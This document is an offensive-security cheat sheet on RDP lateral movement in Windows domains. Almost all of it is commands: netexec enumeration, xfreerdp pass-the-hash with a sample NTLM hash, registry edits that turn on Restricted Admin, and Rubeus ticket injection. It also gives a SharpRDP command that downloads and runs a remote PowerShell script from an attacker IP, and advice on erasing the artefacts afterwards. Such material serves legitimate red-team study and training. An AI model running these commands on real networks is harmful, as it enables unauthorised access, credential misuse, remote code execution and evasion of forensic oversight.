# 05.06 RDP Lateral Movement

> Pivot via RDP with `xfreerdp /pth`, scripted `SharpRDP` execution, or RestrictedAdmin to PtH without caching creds.

## Overview

RDP (TCP 3389) enables GUI-based lateral movement. xfreerdp from Linux supports drive mounting, bandwidth optimisation flags, and Pass-the-Hash via /pth. Restricted Admin mode (DisableRestrictedAdmin=0) allows PtH and PtT over RDP without caching credentials. SharpRDP executes commands programmatically through mstscax.dll without a GUI. Use CleanRunMRU to erase SharpRDP's Run-dialog artefacts.

## Steps

- Enumerate RDP targets: `netexec rdp <subnet> -u <user> -p <pass> -d <domain>` — (Pwn3d!) confirms RDP rights, not necessarily admin.
- Connect from Linux with xfreerdp; use `/drive:.,linux` to mount local directory into session.
- Add bandwidth flags (`/bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache`) for slow/proxy connections.
- Check Restricted Admin registry key; enable it by setting `DisableRestrictedAdmin` to 0.
- PtH from Linux: `xfreerdp /pth:<HASH>`; PtT from Windows: Rubeus `createnetonly` → `asktgt /rc4:HASH /ptt` → `mstsc.exe /restrictedAdmin`.
- SharpRDP: executes command through RDP terminal services library; limited to 259 characters.
- Cover tracks with CleanRunMRU compiled from csc.exe.

## Commands

### netexec rdp enumerate

```bash
netexec rdp <TARGET>/24 -u helen -p 'RedRiot88' -d <DOMAIN>.local
```

### xfreerdp basic

```bash
xfreerdp /u:Helen /p:'RedRiot88' /d:<DOMAIN>.local /v:<TARGET> /dynamic-resolution /drive:.,linux
```

### xfreerdp optimised

```bash
xfreerdp /u:Helen /p:'RedRiot88' /d:<DOMAIN>.local /v:<TARGET> /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
```

### Restricted Admin — query

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
```

### Restricted Admin — enable

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
```

### Restricted Admin — disable

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD
```

### xfreerdp Pass-the-Hash

```bash
proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:<DOMAIN>.local /v:172.20.0.52
```

### Rubeus — forge TGT for PtT

```powershell
.\Rubeus.exe createnetonly /program:powershell.exe /show
```

### Rubeus — asktgt PtT

```powershell
.\Rubeus.exe asktgt /user:helen /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:<DOMAIN>.local /ptt
```

### mstsc Restricted Admin (PtT window)

```powershell
mstsc.exe /restrictedAdmin
```

### SharpRDP code execution

```powershell
.\SharpRDP.exe computername=srv01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" username=<DOMAIN>\helen password=RedRiot88
```
